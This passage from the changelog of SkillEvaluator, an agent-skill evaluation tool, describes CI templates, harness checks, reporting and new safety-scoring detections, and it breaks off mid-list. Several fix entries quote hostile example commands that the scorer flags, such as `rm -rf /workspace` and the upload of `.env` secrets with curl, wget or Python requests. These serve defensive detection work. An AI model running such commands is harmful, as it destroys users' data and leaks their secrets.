# 变更日志

本文件记录 SkillEvaluator 的所有重要变更。

## 未发布

### 文档

- 新增 README 徽章，链接到可复用的 GitHub 和 GitLab CI 模板，并说明如何在不维护评估代码的情况下，为技能仓库添加自动化质量与安全门禁。
- 扩充 README 中的仓库 CI 入门内容，从 Get started 表格链接过去，包含引导式设置、当前 GitHub 和 GitLab 模板及其验证与安全覆盖范围。突出 CI 检查分组背后经过验证的 500+ 条静态规则和检测模式。在 CLI 入门卡片中使用 `validate --tiers 1` 和扫描器设置，全层级命令放在可折叠区域。
- 简化 README 中 Harness Check 的介绍，由于配套的 1.0.1 包已发布，现在标注为无需密钥、无需 agent。
- 在 README 中介绍 Harness Check 之外的其他 Tier 1 检查，并将 `harness` 加入参考页面的默认检查列表。

### 修复

- 格式错误的可选轨迹 `final_metrics` 会使条件使用不可用，但不再中止全新或复用的 Tier 3 结果收集。
- 允许 GitHub 全层级 CI 选择退出部署记录，同时保留环境密钥。现有使用方默认保留部署跟踪。
- 从下一个版本开始，将 PyPI Documentation 链接指向 NVIDIA 文档而非 GitHub README。已发布的 1.0.1 元数据不变。
- Tier 3 安全评分现在会对 Python 或 Node 代码从字面参数向量运行的递归 `rm` 给出破坏性命令发现，例如
  `python3 -c "import subprocess; subprocess.run(['rm', '-rf', '/home/u'])"`、
  `spawnSync('rm', ['-rf', '/home/u'])` 或执行工具的 `code`
  参数，以及参数向量命令如
  `["rm", "-rf", "/workspace"]`；这些在 1.0.1 中安全评分为 `1.0`。该向量按其命名的 shell 命令、从解释器启动的位置进行检查，因此 `/tmp` 目标、仅强制 `rm -f` 删除系统和 home 路径之外的文件，以及缓存或试验输出清理仍评分为 `1.0`。Tier 3 指南列出了不读取的形式。嵌套过深无法解析的 Python 代码在 Python 3.12 及更高版本上不再中止检查。主机检查器和捆绑的 Harbor 验证器均应用此修复。
- Tier 3 安全评分现在会对调用所运行的解释器代码的 HTTP 上传发出网络外泄警告（安全 `0.5`），例如
  `python3 -c "import requests; requests.post(URL, data=d)"`、带 `fetch` 和 `POST` 方法的 `node -e`，或 `subprocess.run(["curl", "-d", "@.env", URL])`，
  以及通过 `xh`、`wget -e post_file=.env`，或同一调用写入的 curl `-K` 配置或 `.wgetrc`，这些在此变更前评分为 `1.0`。路由、测试客户端、mock 以及仅被写入的代码不会警告；读取耗尽工作预算的调用会警告，报告为不完整检查而非观察到的不安全行为。Tier 3 指南列出了不读取的形式。主机检查器和捆绑的 Harbor 验证器均应用此修复。

## 1.0.1 - 2026-11-17

### 文档

- 为 1.0.1 刷新版本化 CI 目录和仅评论设置，并澄清全层级 CLI 入门已包含在 0.9.0 中。将已发布的 PyPI 可用性与新的发布版本固定分开。
- 将 Harness Check、JUnit 和 NeMo Gym 适配器描述为 1.0.1 能力，同时明确包可用性。

### 修复

- 默认禁用 OpenCode 快照，以避免任务完成后出现 broken-pipe 失败，同时保留用户显式快照设置。
- 在 Docker、本地和原生 Harbor 命令构建中保留不透明的 Claude 网关模型 ID，同时保持原生 Anthropic、Vertex 和 Bedrock 路由独立于网关支持的 judge。
- 在 JSON 和 HTML 报告中将独立的 Tier 2 评估计为一个技能，并优先处理运行时失败恢复，而不隐藏编写的源代码或运行器指令。
- 按已安装的评估器版本选择入门演示的分数预期，保留已发布的 0.9.0 示例，同时识别 1.0.0 分数。
- 在聚合报告来源中保留 GitLab 工具修订版本。
- 记录 OpenCode 所需的经过测试的可编辑 NeMo Gym 安装，以及已完成的 Codex、Claude Code 和 OpenCode 实时配对运行。

- 文件夹验证器仅在请求的扫描根目录下应用技能发现排除项。位于名为 `results`、`evals` 或 `.versions` 的目录内的检出不再丢失所有实时技能，同时嵌套的评估快照仍被排除。

- 在预算核算前拒绝重复的价格文件键和布尔费率，并将无法表示的整数费率报告为配置错误。
- 捆绑的 `create-custom-grader` 示例现在在 `evals/files/` 下提供基准文件夹及其前两个用例要求 agent 转换的现有技能，每个用例声明 `files`，因此只暂存自己的 fixture。此前这些用例没有可用的工作区输入。
- 捆绑的 `api-caller` 示例不再在 Tier 2 去重中失败：其两个脚本共享 `scripts/url_safety.py` 中的一个 HTTP(S) URL 检查，而不是各自定义 `_validate_http_url()`，并且 `call_api.py` 不再在其模块 docstring 中重复 SKILL.md 用法部分。
- Tier 3 数据集生成不再将仅导入的辅助模块（如 `url_safety.py`）命名为用例的 `expected_script`，前提是技能有运行时执行操作的脚本。只有一个脚本或仅有辅助模块的技能保留其先前选择。

- Tier 3 安全评分现在读取 `eval`、`env -S` 或 `git grep -O` 分页器运行的 `rm`，解码并连接 `$'...'` 词，因此
  `eval '$CMD -rf /workspace'` 和 `env -S 'rm\_-rf\_/workspace'` 会收到破坏性命令发现，带引号的 `rm` 命令名如
  `"rm" -rf /workspace` 也会，在 `bash -c` 文本或 here-document 仅在其他 `rm` 文本旁提供给 shell 的文本中。其他命令保持其读取，因此
  `grep 'rm' -rn .` 和数组字面量如 `cmd=("rm" -rf build)` 不会收到。`rm` 模式现在以线性时间运行：`rm -` 和
  40,000 个字母 `r` 只需毫秒而非 10 到 13 秒。词法分析器无法拆分的文本按命令单遍读取，其中超过 65,536 个不同 `rm` 片段会收到，读取带引号 `rm` 名称或 `eval`、`env -S` 或可能运行 `rm` 的分页器文本的命令也会，包括此类文本内部，当其超过 64 KiB 或 4,096 个 token 时。这些读取在其检查的文本计数达到 256 KiB 轨迹时停止，每个词、shell 操作符和替换额外计 10 个字符，轨迹其余部分保持先前读取。

## 1.0.0 - 2026-11-17

### 发布概览

SkillEvaluator 1.0.0 新增 harness 兼容性检查、CI 报告集成，以及评估可靠性、安全性和报告方面的改进。合并的源代码准备快照为 `d8e4e82878a95c44a1881c9e200fb8e568c63923`。与已发布的 v0.9.0 相比，它包含 210 个变更 PR 加上发布准备 PR [#600](https://github.com/NVIDIA/SkillEvaluator/pull/600)，共 211 个 PR。PR #498 已包含在 v0.9.0 中，不计入该数量。Main 随后在 `0f3d980d1feb322da768c92d1735973f39be3d0d` 合并了 [#611](https://github.com/NVIDIA/SkillEvaluator/pull/611)。截至该修订版的草稿范围为 211 个变更 PR 加上 #600，共 212 个 PR；发布冻结时必须更新最终源代码标识。

### 亮点

- 通过 `--quality-config` 使 Tier 1 效率、可发现性和正确性规则可配置：token 预算、描述长度和保留名称设置、扣分、消息和建议。打包分数保持不变；受影响的发现 ID 和打包质量配置摘要变更一次（#611）。
- 新增 `skillevaluator harness-check` 和 Tier 1 兼容性面板，支持 Claude Code、Codex、Copilot CLI、Hermes、OpenClaw 和 OpenCode。版本化静态配置文件覆盖发现、frontmatter、描述和交付限制、调用字段、重复安装和插件组件。默认策略下发现为建议性；独立 `harness-check` 退出码为 0。
- 新增 JUnit XML 报告，使用 `-r junit`。不完整检查为错误，未运行的检查为跳过，失败遵循与退出码相同的门禁。
- 新增离线 pre-commit 钩子：`skillevaluator-quality`、`skillevaluator-schema` 和 `skillevaluator-lint-scripts`。这些钩子无需 API 密钥、Docker、网络访问或扫描器下载。
- 新增实验性 `tier3 evaluate --backend nemo-gym` 适配器，共享评估用例、验证器结果和报告格式。Harbor 仍为默认后端。JSON 和 HTML 标识所用后端。
- 新增可选的 grader 资格覆盖策略、风险限制、预检检查和保留的评估证据。这些工具和合成试点不建立 grader 可靠性或发布资格。
- 新增可复用工作流，用于带评分的 Tier 1 PR 评论，无需托管报告或 GitHub Pages。现有生成的 CI 配置保留其固定版本。
- 改进部分运行证据、预算拒绝和跳过基线的报告、token 和成本核算、价格来源以及基准判定。
- 扩展凭据脱敏，改进激活和声明式检查证据，强制扫描器固定版本，并将不完整扫描保留为不完整。
- 刷新 HTML 报告，改进 SARIF 路径编码，新增数据集优先入门、安装指南和指标参考。

### 合并时包含的其他修复

- [#738](https://github.com/NVIDIA/SkillEvaluator/pull/738)：从文本分析器的顶部词中排除仅标点 token。
- [#737](https://github.com/NVIDIA/SkillEvaluator/pull/737)：接受带符号的计算器转换，拒绝尾随或格式错误的输入。
- [#760](https://github.com/NVIDIA/SkillEvaluator/pull/760)：避免有效表达式上的 Python lint 递归失败。

所有三个修复均包含在合并的源代码快照中，尽管它们不在 #600 的原始准备分支中。该合并快照时没有缺失 main 分支变更。

### 升级与兼容性说明

- 仍支持 Python 3.12-3.14。基础安装现在包含 Bandit 和 uv；Tier 2/3 仍需要其 extras。托管扫描器在首次使用时下载。
- 默认作者归属要求变为建议性。使用 `--profile registry` 实施严格的作者和元数据 ID 要求。策略摘要变更。
- 将严重性覆盖从 `SECURITY.Unknown (AE1)` 重命名为
  `SECURITY.Incomplete referenced artifact analysis (AE1)`。AE1 发现 ID 随改进的发现文本变更一次。
- 未验证的钩子载荷现在触发 Critical 安全门禁失败，严重性覆盖和 `--llm-verify` 无法清除。
- 托管 SkillSpector 移至 2.13.4。NVIDIA Build 默认为
  `nvidia/nemotron-3.5-lightning-30b-a3b`；SkillSpector 的 Anthropic/Bedrock 默认值移至 Claude Opus 5.5。显式模型覆盖仍可用。
- NeMo Gym 为实验性且仅限 Docker。它需要单独固定的兼容运行时；公共 `nemo-gym==0.7.0` 不兼容。记录了特定 Codex 和 Claude Code 实时运行；OpenCode 目前在 Gym agent 设置期间失败。更广泛的 agent/评分组合仍需资格认证。
- 现有 CI 工作流保留不可变固定版本，需要显式更新。1.0.0 源代码准备不替代最终 CI 镜像/捆绑包和包验证，也不完成产品发布。

[完整 PR 清单](https://github.com/NVIDIA/SkillEvaluator/pull/600)和
[详细源代码变更日志](https://github.com/NVIDIA/SkillEvaluator/blob/d8e4e82878a95c44a1881c9e200fb8e568c63923/CHANGELOG.md)
记录发布范围。最终发布的构建产物必须标识其自身经过审查的源代码修订版。

### 新增

- 数据集优先的 Tier 3 演练：在显式实时评估前准备和审查用例，附简短数据集指南和简洁的运行设置页面。Tier 1 和 Tier 2 现在有简短的首次运行路径；详细检查、策略、算法和运行契约移至链接参考，保留旧锚点。安装默认使用轻量基础包，并显式提供 `[all]` 以支持全部三个层级。

- 集中安装指南，包含 pip 和 uv PyPI 安装、uv 引导，以及全部三个层级的直接 GitHub 源代码选项。发布差异、扫描器设置和更小安装记录在链接的选项页面上。层级指南和快速入门使用已安装的 CLI。导航按顺序分组 Tier 1 验证、Tier 1 Harness Check、Tier 2 去重和 Tier 3 实时 Agent 评估。
- 任务优先的文档入口页面：三步无密钥快速入门和带提供方选项卡、就绪检查和报告解读的实时评估演练。详细 Tier 3 运行选项、运行时行为、评分、结果和实验现在有单独的参考页面；现有主题书签链接到其新位置。
  README harness 面板标注为说明性配置文件摘要。
- 离线 Tier 1 技能检查的 pre-commit 钩子：`.pre-commit-hooks.yaml`
  暴露 `skillevaluator-quality`、`skillevaluator-schema` 和
  `skillevaluator-lint-scripts`。隐藏的 `skillevaluator precommit-run` 入口将变更文件映射到技能根目录，并在无需 API 密钥、网络、Docker 或扫描器下载的情况下运行每个检查。
- JUnit XML 报告格式（`-r junit`、`.junit.xml`），用于 CI 测试报告构建产物。每个检查组发出一个 testsuite，失败包含记录的 file:line 并遵循与退出码相同的门禁，不完整扫描器报告为错误，未运行的检查为跳过而非报告为通过。
- Tier 3 报告数据和 JSON 报告记录运行评估的执行后端，作为 `execution_backend`（`harbor` 或 `nemo-gym`），位于沙箱 `environment` 旁边。
- `report.html` 在 agent 评估摘要和评估数据集头部中，于沙箱环境旁显示 Tier 3 执行后端（Harbor 或 NeMo Gym）。
- 将实测的真实提供方保存目录规模与 5,000 条目内存资格认证分开记录，作为依赖 fixture 的示例而非保证。
- `harness` 结果标记项目技能在 harness 也读取的用户级技能文件夹中存在同名副本（`*-USER-COPY`）。Claude Code 使用用户副本，Codex 列出两者，其他 harness 使用项目副本。
- `harness` 结果标记描述与同一文件夹中另一技能几乎相同的技能（`*-LOOKALIKE`），无需嵌入密钥。模型可能将请求路由到两者中错误的一个。
- `skillevaluator` agent 技能现在告知 agent 检查 CLI，并在用户许可下安装缺失的 CLI（`uv tool install`、`pipx`、Python 3.12-3.14 虚拟环境中的 pip，或 `uvx`），并新增 CLI 缺失的 Tier 3 用例。该用例的目标技能内联在其提示中，因此安装的技能文件夹不携带第二个 `SKILL.md`。
- 规范 `comment-skill-checks.yml` 可复用工作流和源模板，用于标准带评分 Tier 1 PR 评论，无需托管报告。它验证现有签名回执和原生证据，复用共享报告和评论辅助函数，无需 Pages 配置或历史分支。未来生成的捆绑包包含该模板；归档捆绑包和已发布的入门 CLI 保留其现有托管发布器设置。
- 每个 `harness` 规则记录置信度级别，以及在发布之间行为变化时适用的版本（用 `-v` 显示）。`harness-check
  --harness-version codex=0.170.0` 在运行与配置文件验证版本不同的发布时添加注释。
- `harness-check` 接受某些限制依赖的模型设置：`--context-tokens`、
  `--custom-provider`、`--explicit-invocation` 和 `--headless`（带 `allowed-tools` 的 Claude Code 技能不会以 headless 加载）。
- 插件组件规则：技能命名空间、Codex 的插件技能上限和 Agent Plugins 钩子、Copilot CLI MCP 服务器名称、禁用的插件，以及 harness 不交付的组件。
- 对插件文件夹运行 `harness-check` 显示每个 harness 接受的插件格式（`.claude-plugin`、`.codex-plugin`、Copilot、Agent Plugins v1、Hermes
  `plugin.yaml`）并标记空插件。
- harness 门禁的 `harness` 规则：Hermes `platforms` 和 OpenClaw
  `metadata.openclaw.requires`。
- 调用字段的 `harness` 规则：`disable-model-invocation`、Codex 的
  `agents/openai.yaml` 策略、`allowed-tools`、仅 Claude